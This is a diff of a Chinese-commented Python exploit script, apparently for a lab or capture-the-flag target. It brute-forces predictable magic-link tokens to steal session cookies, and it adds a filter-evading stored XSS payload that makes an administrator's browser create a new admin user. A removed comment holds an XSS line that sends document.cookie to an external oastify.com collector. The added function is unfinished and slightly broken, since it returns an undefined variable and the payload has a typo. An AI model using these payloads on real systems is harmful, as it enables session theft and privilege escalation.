@@ -20,6 +20,7 @@ CHARSET = CHAR_LOWER + CHAR_LOWER.upper() + NUMBERS + SYMBOLS
 TOKEN_LENGTH = 42
 GENERATE_PATH = "/generateMagicLink" # 触发生成 token 的路径
 MAGIC_LINK_PATH = "/magicLink/{}" # 使用 token 的路径
+XSS_PATH = "/question"
 
 # token生成器，由于知道了种子是System.currentTimeMillis()，并且用的Random类，输入爆破的种子值就是token
 def create_token_using_java_random_pkg(seed:str, user_id: int):
@@ -78,6 +79,24 @@ def consume_magic_link(session: requests.Session, base_url: str, token: str):
     else:
         return
 
+# 让管理员xss指定创建管理员用户，后台有过滤，但是仅对开头结尾做了tag过滤
+# 有跨域限制，只能在当前域内操作,并且单双引号会被过滤，用String绕过和URLSearchParams，后端储存的t不是字符串是True输入的isAdmin属性要注意
+# 很奇怪name:String.fromCharCode(98)会被拦截
+# 这个可以
+# a<script>fetch(String.fromCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:88,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
+def generate_xss_payload(session: requests.Session, base_url: str):
+    """
+    POST /question 使用cookie的moderator权限用户发送帖子
+    """
+    payload = r"""
+    a<script>fetch(String.fromdCharCode(47,97,100,109,105,110,47,117,115,101,114,115,47,99,114,101,97,116,101),{method:String.fromCharCode(80,79,83,84),body:new URLSearchParams({name:88,email:1,isAdmin:String.fromCharCode(116,114,117,101)})})</script>em>
+    """ 
+    url = urllib.parse.urljoin(base_url, XSS_PATH)
+    # @ TODO 没写完
+    # data = {"username": username}
+    # resp = session.post(url, data=data, allow_redirects=False)
+    return resp.status_code, resp.text
+
 if __name__ == "__main__":
     base_url = "http://192.168.179.234:8888/"
     username = "Carl"
@@ -98,9 +117,6 @@ if __name__ == "__main__":
             if cookie:
                 print("成功爆破出token，捕获cookie:", cookie)
                 break
+
         if not cookie:
             print("没有成功捕获token，请排除错误")
-
-        
-# xss <code onafterscriptexecute=alert(1)><script>1</script>
-# <code onafterscriptexecute=alert(1)><script>document.location="http://Yvnmd2x97pmyx8ictgoq94vrm6dc40uoj.oastify.com/${encodeURIComponent(document.cookie)"</script>
